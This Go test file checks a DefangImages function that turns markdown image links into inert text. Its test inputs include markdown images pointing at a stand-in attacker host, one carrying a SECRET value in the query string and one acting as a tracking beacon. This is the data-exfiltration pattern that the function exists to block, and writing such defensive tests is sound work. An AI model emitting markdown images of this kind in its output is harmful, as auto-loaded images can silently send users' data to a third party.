package emit_test

import (
	"strings"
	"testing"

	"github.com/christopherdavenport/unblink/internal/emit"
)

func TestDefangImages(t *testing.T) {
	cases := []struct {
		in       string
		wantHas  []string
		wantGone []string
	}{
		{
			in:       `Look ![secret](https://attacker.example/log?d=SECRET) here`,
			wantHas:  []string{"[image: secret — https://attacker.example/log?d=SECRET]"},
			wantGone: []string{"![secret]"},
		},
		{
			in:       `![](https://attacker.example/beacon.gif)`,
			wantHas:  []string{"[image: https://attacker.example/beacon.gif]"},
			wantGone: []string{"!["},
		},
		{
			in:       `![logo](https://x.example/a.png "Title Text")`,
			wantHas:  []string{"[image: logo — https://x.example/a.png]"},
			wantGone: []string{"Title Text", "!["},
		},
		{
			// Ordinary links must be left intact.
			in:       `A [real link](https://example.com/page) stays.`,
			wantHas:  []string{"[real link](https://example.com/page)"},
			wantGone: []string{"[image:"},
		},
	}
	for _, c := range cases {
		got := emit.DefangImages(c.in)
		for _, w := range c.wantHas {
			if !strings.Contains(got, w) {
				t.Errorf("DefangImages(%q) = %q, missing %q", c.in, got, w)
			}
		}
		for _, w := range c.wantGone {
			if strings.Contains(got, w) {
				t.Errorf("DefangImages(%q) = %q, should not contain %q", c.in, got, w)
			}
		}
	}
}
